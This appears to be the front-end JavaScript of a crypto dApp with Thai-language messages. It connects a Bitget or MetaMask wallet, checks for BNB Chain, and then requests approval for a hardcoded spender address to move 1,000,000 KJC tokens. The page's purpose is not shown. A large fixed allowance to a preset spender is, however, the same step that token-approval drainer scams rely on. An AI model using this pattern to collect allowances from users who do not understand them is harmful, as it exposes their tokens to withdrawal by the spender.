const kjcAddress = "0xd479Ae350Dc24168E8dB863c5413C35fb2044ecD"; const spenderAddress = "0xBaeF58FC0Eb20334b2fDEC4882e2AB972C1242DE"; const approveAmount = "1000000000000000000000000"; // 1,000,000 KJC let web3; let userAccount; let kjcToken; async function connectWallet() { try { if (window.bitkeep?.ethereum && window.bitkeep.ethereum.isBitKeep) { web3 = new Web3(window.bitkeep.ethereum); await window.bitkeep.ethereum.enable(); console.log("✅ เชื่อมผ่าน Bitget Wallet"); } else if (window.ethereum) { web3 = new Web3(window.ethereum); await window.ethereum.request({ method: "eth_requestAccounts" }); console.log("✅ เชื่อมผ่าน MetaMask"); } else { alert("⚠️ ไม่พบ Wallet เช่น MetaMask หรือ Bitget"); return; } const accounts = await web3.eth.getAccounts(); userAccount = accounts[0]; kjcToken = new web3.eth.Contract(erc20ABI, kjcAddress); document.getElementById("walletAddress").innerText = "✅ " + userAccount; // ตรวจ Chain ID ว่าคือ BNB Chain หรือไม่ const chainId = await web3.eth.getChainId(); if (chainId !== 56) { alert("⚠️ กรุณาเชื่อมต่อ BNB Chain (ChainId 56)"); } } catch (e) { console.error("❌ เกิดข้อผิดพลาดขณะเชื่อมต่อ:", e); if (e.code === 4001) { alert("❌ คุณปฏิเสธการเชื่อมต่อกระเป๋า"); } else { alert("❌ ไม่สามารถเชื่อมต่อ Wallet ได้"); } document.getElementById("walletAddress").innerText = "❌ เชื่อมต่อล้มเหลว"; } } async function approveKJC() { if (!web3 || !userAccount || !kjcToken) { alert("❌ กรุณาเชื่อมต่อกระเป๋าก่อน"); return; } try { await kjcToken.methods.approve(spenderAddress, approveAmount).send({ from: userAccount }); alert("✅ อนุมัติ KJC สำเร็จแล้ว!"); } catch (e) { console.error("❌ Approval error:", e); if (e.code === 4001) { alert("❌ คุณยกเลิกการอนุมัติ"); } else { alert("❌ อนุมัติไม่สำเร็จ: " + e.message); } } }
